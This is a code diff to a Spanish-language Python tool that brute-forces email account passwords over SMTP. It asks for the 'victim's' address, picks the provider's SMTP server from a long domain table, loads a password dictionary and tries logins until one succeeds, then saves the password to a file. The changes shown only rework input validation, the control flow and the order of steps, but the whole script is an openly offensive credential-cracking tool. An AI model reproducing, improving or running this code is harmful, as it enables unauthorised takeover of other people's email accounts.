@@ -22,6 +22,7 @@ import os
 Autor = "By: LawlietJH"
 Version = "v1.1.0"
 xD = False
+xD2 = False
 NombA = "pwd.zion"
 
 #EMCrk - Banner Random
@@ -53,82 +54,87 @@ def Correo():
 	
 	global nombSMTP
 	global Usuario
+	global xD2
 	
-	Usuario = input("\n\n [+] Dirección de Correo de la Victima: ")
+	while xD2 == False:
 	
-	#Se Usara El Nombre SMTP dependiendo de el servicio de correo.
-	if Usuario.lower().endswith('@gmail.com'):
-		nombSMTP = "smtp.gmail.com"
-	elif Usuario.lower().endswith('@hotmail.com'):
-		nombSMTP = "smtp.outlook.com"
-	elif Usuario.lower().endswith('@zoho.com'):
-		nombSMTP = "smtp.zoho.com"
-	elif Usuario.lower().endswith('@gmx.es'):
-		nombSMTP = "smtp.gmx.es"
-	elif Usuario.lower().endswith('@gmx.net'):
-		nombSMTP = "mail.gmx.net"
-	elif Usuario.lower().endswith('@live.com'):
-		nombSMTP = "smtp.live.com"
-	elif Usuario.lower().endswith('@mail.com'):
-		nombSMTP = "smtp.mail.com"
-	elif Usuario.lower().endswith('@aol.com'):
-		nombSMTP = "smtp.aol.com"
-	elif Usuario.lower().endswith('@fastmail.com'):
-		nombSMTP = "smtp.fastmail.com"
-	elif Usuario.lower().endswith('@airmail.net'):
-		nombSMTP = "mail.airmail.net"
-	elif Usuario.lower().endswith('@hushmail.com'):
-		nombSMTP = "smtp.hushmail.com"
-	elif Usuario.lower().endswith('@1and1.com'):
-		nombSMTP = "smtp.1and1.com"
-	elif Usuario.lower().endswith('@att.net'):
-		nombSMTP = "outbound.att.net"
-	elif Usuario.lower().endswith('@bluewin.ch'):
-		nombSMTP = "smtpauths.bluewin.ch"
-	elif Usuario.lower().endswith('@btconnect.com'):
-		nombSMTP = "mail.btconnect.tom"
-	elif Usuario.lower().endswith('@earthlink.net'):
-		nombSMTP = "smtpauth.earthlink.net"
-	elif Usuario.lower().endswith('@hotpop.com'):
-		nombSMTP = "mail.hotpop.com"
-	elif Usuario.lower().endswith('@libero.it'):
-		nombSMTP = "mail.libero.it"
-	elif Usuario.lower().endswith('@lycos.com'):
-		nombSMTP = "smtp.lycos.com"
-	elif Usuario.lower().endswith('@o2.com'):
-		nombSMTP = "smtp.o2.com"
-	elif Usuario.lower().endswith('@oragne.com'):
-		nombSMTP = "smtp.orange.com"
-	elif Usuario.lower().endswith('@terra.com'):
-		nombSMTP = "smtp.terra.com"
-	elif Usuario.lower().endswith('@tiscali.co.uk'):
-		nombSMTP = "smtp.tiscali.co.uk"
-	elif Usuario.lower().endswith('@virgin.net'):
-		nombSMTP = "smtp.virgin.net"
-	elif Usuario.lower().endswith('@wanadoo.fr'):
-		nombSMTP = "smtp.wanadoo.fr"
-	elif Usuario.lower().endswith('@inbox.com'):
-		nombSMTP = "smtp.inbox.com"
-	elif Usuario.lower().endswith(('@yahoo.com', '@roketmail.com', '@ymail.com')):
-		nombSMTP = "smtp.mail.yahoo.com"
-	elif Usuario.lower().endswith('@housemusic.com'):
-		nombSMTP = "smtp.housemusic.com"
-	elif Usuario.lower().endswith('@rediffmail.com'):
-		nombSMTP = "smtp.rediffmail.com"
-	elif Usuario.lower().endswith('@comcast.net'):
-		nombSMTP = "smtp.comcast.net"
-	elif Usuario.lower().endswith('@web.de'):
-		nombSMTP = "smtp.web.de"
-	elif Usuario.lower().endswith('@verizon.net'):
-		nombSMTP = "outgoing.verizon.net"
-	elif Usuario.lower().endswith('@upla.cl'):
-		nombSMTP = "smtp.upla.cl"
-	elif Usuario.lower().endswith('@udec.cl'):
-		nombSMTP = "smtp.udec.cl"
-	else:
-		print("\n\t\t [!] Correo No Válido.")
-		os.system('Timeout /nobreak 02 > Nul')
-		exit(0)
+		xD2 = True
+		
+		Usuario = input("\n\n [+] Dirección de Correo de la Victima: ")
+	
+		#Se Usara El Nombre SMTP dependiendo de el servicio de correo.
+		if Usuario.lower().endswith('@gmail.com'):
+			nombSMTP = "smtp.gmail.com"
+		elif Usuario.lower().endswith('@hotmail.com'):
+			nombSMTP = "smtp.outlook.com"
+		elif Usuario.lower().endswith('@zoho.com'):
+			nombSMTP = "smtp.zoho.com"
+		elif Usuario.lower().endswith('@gmx.es'):
+			nombSMTP = "smtp.gmx.es"
+		elif Usuario.lower().endswith('@gmx.net'):
+			nombSMTP = "mail.gmx.net"
+		elif Usuario.lower().endswith('@live.com'):
+			nombSMTP = "smtp.live.com"
+		elif Usuario.lower().endswith('@mail.com'):
+			nombSMTP = "smtp.mail.com"
+		elif Usuario.lower().endswith('@aol.com'):
+			nombSMTP = "smtp.aol.com"
+		elif Usuario.lower().endswith('@fastmail.com'):
+			nombSMTP = "smtp.fastmail.com"
+		elif Usuario.lower().endswith('@airmail.net'):
+			nombSMTP = "mail.airmail.net"
+		elif Usuario.lower().endswith('@hushmail.com'):
+			nombSMTP = "smtp.hushmail.com"
+		elif Usuario.lower().endswith('@1and1.com'):
+			nombSMTP = "smtp.1and1.com"
+		elif Usuario.lower().endswith('@att.net'):
+			nombSMTP = "outbound.att.net"
+		elif Usuario.lower().endswith('@bluewin.ch'):
+			nombSMTP = "smtpauths.bluewin.ch"
+		elif Usuario.lower().endswith('@btconnect.com'):
+			nombSMTP = "mail.btconnect.tom"
+		elif Usuario.lower().endswith('@earthlink.net'):
+			nombSMTP = "smtpauth.earthlink.net"
+		elif Usuario.lower().endswith('@hotpop.com'):
+			nombSMTP = "mail.hotpop.com"
+		elif Usuario.lower().endswith('@libero.it'):
+			nombSMTP = "mail.libero.it"
+		elif Usuario.lower().endswith('@lycos.com'):
+			nombSMTP = "smtp.lycos.com"
+		elif Usuario.lower().endswith('@o2.com'):
+			nombSMTP = "smtp.o2.com"
+		elif Usuario.lower().endswith('@oragne.com'):
+			nombSMTP = "smtp.orange.com"
+		elif Usuario.lower().endswith('@terra.com'):
+			nombSMTP = "smtp.terra.com"
+		elif Usuario.lower().endswith('@tiscali.co.uk'):
+			nombSMTP = "smtp.tiscali.co.uk"
+		elif Usuario.lower().endswith('@virgin.net'):
+			nombSMTP = "smtp.virgin.net"
+		elif Usuario.lower().endswith('@wanadoo.fr'):
+			nombSMTP = "smtp.wanadoo.fr"
+		elif Usuario.lower().endswith('@inbox.com'):
+			nombSMTP = "smtp.inbox.com"
+		elif Usuario.lower().endswith(('@yahoo.com', '@roketmail.com', '@ymail.com')):
+			nombSMTP = "smtp.mail.yahoo.com"
+		elif Usuario.lower().endswith('@housemusic.com'):
+			nombSMTP = "smtp.housemusic.com"
+		elif Usuario.lower().endswith('@rediffmail.com'):
+			nombSMTP = "smtp.rediffmail.com"
+		elif Usuario.lower().endswith('@comcast.net'):
+			nombSMTP = "smtp.comcast.net"
+		elif Usuario.lower().endswith('@web.de'):
+			nombSMTP = "smtp.web.de"
+		elif Usuario.lower().endswith('@verizon.net'):
+			nombSMTP = "outgoing.verizon.net"
+		elif Usuario.lower().endswith('@upla.cl'):
+			nombSMTP = "smtp.upla.cl"
+		elif Usuario.lower().endswith('@udec.cl'):
+			nombSMTP = "smtp.udec.cl"
+		else:
+			print("\n\t\t [!] Correo No Válido.")
+			os.system('Timeout /nobreak 02 > Nul')
+			xD2 = False
 	
 
 def Diccionario(NombreA):
@@ -157,11 +163,11 @@ def Diccionario(NombreA):
 				Zion.close
 				print("\n\n\t [*] Saliendo...")
 				os.system('Timeout /nobreak 02 > Nul')
-				exit(0)
+				main()
 			else:
 				print("\n\n\t [*] Saliendo...")
 				os.system('Timeout /nobreak 02 > Nul')
-				exit(0)
+				main()
 				
 	else:
 		print("\n\t No se encontro el Diccionario: "+NombreA)
@@ -180,11 +186,11 @@ def Diccionario(NombreA):
 				Zion.close
 				print("\n\n\t [*] Saliendo...")
 				os.system('Timeout /nobreak 02 > Nul')
-				exit(0)
+				main()
 			else:
 				print("\n\n\t [*] Saliendo...")
 				os.system('Timeout /nobreak 02 > Nul')
-				exit(0)
+				main()
 
 
 def Conexion():
@@ -223,7 +229,7 @@ def Conexion():
 			print("\n\t [!] La Contraseña ha sido exitosamente encontrada.")
 			print("\n\t [+] Fue Guardada En El Archivo CC.zion.\n\n\t "+Autor)
 			os.system('Timeout /nobreak 03 > Nul')
-			exit(0)
+			main()
 		except smtplib.SMTPAuthenticationError:
 			print ("\t [*] " + str(Pwd))
 	
@@ -252,8 +258,8 @@ def main():
 			print(ServC)
 			
 			print(banner)
-			Correo()
 			Diccionario(NombA)
+			Correo()
 			print(time.strftime("\t [!] Iniciado: %d/%m/%Y %H:%M:%S"))
 			Conexion()
 			print(time.strftime("\n\n\n\t [!] Finalizado: %d/%m/%Y %H:%M:%S"))
@@ -303,11 +309,12 @@ def main():
 		
 	else:
 		print(banner)
-		Correo()
 		Diccionario(NombA)
 		print("\n\t [!] Se Usará El Diccionario Por Defecto: pwd.zion")
+		Correo()
+		TiempoI = time.strftime("\n\n\n\t [!] Iniciado:   %d/%m/%Y %H:%M:%S")
 		Conexion()
-		print(time.strftime("\n\n\n\t [!] Iniciado:   %d/%m/%Y %H:%M:%S"))
+		print(TiempoI)
 		print(time.strftime("\n\t [!] Finalizado: %d/%m/%Y %H:%M:%S"))
 		
 		if xD == False:
